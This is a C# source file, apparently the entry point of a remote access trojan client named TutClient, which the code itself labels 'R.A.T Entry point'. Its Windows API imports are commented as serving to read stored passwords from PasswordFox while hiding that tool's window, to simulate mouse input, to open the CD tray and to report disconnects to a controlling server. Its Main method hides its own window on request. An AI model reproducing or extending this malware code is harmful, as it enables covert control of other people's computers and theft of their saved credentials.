#undef EnableAutoBypass
#undef HideWindow
using System.Diagnostics;
using System.Runtime.InteropServices;

using TutClient.Bootstrapper;
using TutClient.Handlers;

using Unity;

namespace TutClient
{
    /// <summary>
    /// The main module
    /// </summary>
    public class Program
    {
        #region dllImports
        
        /// <summary>
        /// MCI Send String for openind the CD Tray
        /// </summary>
        /// <param name="lpstrCommand">Command</param>
        /// <param name="lpstrReturnString">Return Value</param>
        /// <param name="uReturnLength">Return value's length</param>
        /// <param name="hwndCallback">Callback's handle</param>
        [DllImport("winmm.dll", EntryPoint = "mciSendStringA")]
        public static extern void mciSendStringA(string lpstrCommand,
        string lpstrReturnString, int uReturnLength, int hwndCallback);
        
        /// <summary>
        /// Find window for reading data from PasswordFox
        /// </summary>
        /// <param name="className">Window's class name</param>
        /// <param name="windowText">The text of the window</param>
        /// <returns>The handle of the window</returns>
        [DllImport("user32.dll")]
        public static extern int FindWindow(string className, string windowText);
        
        /// <summary>
        /// Show Window for hiding password fox's window, while still reading passwords from it
        /// </summary>
        /// <param name="hwnd">The handle of the window</param>
        /// <param name="command">The command to send</param>
        /// <returns>The success</returns>
        [DllImport("user32.dll")]
        public static extern int ShowWindow(int hwnd, int command);
        
        /// <summary>
        /// Find a child window, for PF's listView
        /// </summary>
        /// <param name="hWnd1">The handle of the parent window</param>
        /// <param name="hWnd2">The handle of the control to get the next child after</param>
        /// <param name="lpsz1">The class of the window</param>
        /// <param name="lpsz2">The text of the window</param>
        /// <returns></returns>
        [DllImport("User32.dll")]
        public static extern int FindWindowEx(int hWnd1, int hWnd2, string lpsz1, string lpsz2);
        
        /// <summary>
        /// Detect shutdown, logout ctrl c, and other signals to notify the server when disconnecting
        /// </summary>
        /// <param name="handler">The event handler to attach</param>
        /// <param name="add">True if the event handler should be added, otherwise false</param>
        /// <returns>The success</returns>
        [DllImport("Kernel32")]
        public static extern bool SetConsoleCtrlHandler(OnEventHandler handler, bool add);
        
        /// <summary>
        /// Generate a mouse event
        /// </summary>
        /// <param name="dwFlags">The ID of the click to do</param>
        /// <param name="dx"></param>
        /// <param name="dy"></param>
        /// <param name="dwData"></param>
        /// <param name="dwExtraInfo"></param>
        [DllImport("user32.dll")]
        public static extern void mouse_event(int dwFlags, int dx, int dy, int dwData, int dwExtraInfo);

        #endregion
        
        private static UnityContainer _unityContainer;
        public static UnityContainer UnityContainer => _unityContainer;

        /// <summary>
        /// R.A.T Entry point
        /// </summary>
        /// <param name="args">Command-Line arguments</param>
        static void Main(string[] args)
        {
            if(args.Length > 0)
            {
                if(args[0].Equals("hide"))
                {
                    //Hide application if specified
                    ShowWindow(Process.GetCurrentProcess().MainWindowHandle.ToInt32(), 0); 
                }
            }

            _unityContainer = new UnityContainer();
            _unityContainer.AddNewExtension<ControlsUnityContainer>();
            _unityContainer.AddNewExtension<HandlersUnityContainer>();
            _unityContainer.AddNewExtension<HelpersUnityContainer>();
        }

    }
}